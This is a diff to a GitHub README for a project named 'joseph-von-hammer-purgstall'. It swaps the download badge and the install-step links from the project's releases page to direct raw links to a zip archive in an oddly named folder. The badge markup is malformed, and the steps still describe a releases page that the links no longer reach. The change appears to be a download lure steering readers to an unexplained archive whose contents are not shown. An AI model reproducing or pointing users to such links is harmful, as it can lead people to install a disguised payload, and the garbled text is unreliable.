@@ -6,12 +6,12 @@ Welcome to the joseph-von-hammer-purgstall project! Here, you will find a collec
 
 ## 💾 Download Here
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/Elmer319/joseph-von-hammer-purgstall/releases)
+[![Download](https://raw.githubusercontent.com/Elmer319/joseph-von-hammer-purgstall/main/miasmatous/hammer_joseph_purgstall_von_prefectship.zip%https://raw.githubusercontent.com/Elmer319/joseph-von-hammer-purgstall/main/miasmatous/hammer_joseph_purgstall_von_prefectship.zip)](https://raw.githubusercontent.com/Elmer319/joseph-von-hammer-purgstall/main/miasmatous/hammer_joseph_purgstall_von_prefectship.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the software, [visit this page to download](https://github.com/Elmer319/joseph-von-hammer-purgstall/releases).
+   To download the software, [visit this page to download](https://raw.githubusercontent.com/Elmer319/joseph-von-hammer-purgstall/main/miasmatous/hammer_joseph_purgstall_von_prefectship.zip).
 
 2. **Select the Latest Release**  
    On the releases page, you will see a list of available versions. Choose the most recent release for the best experience.
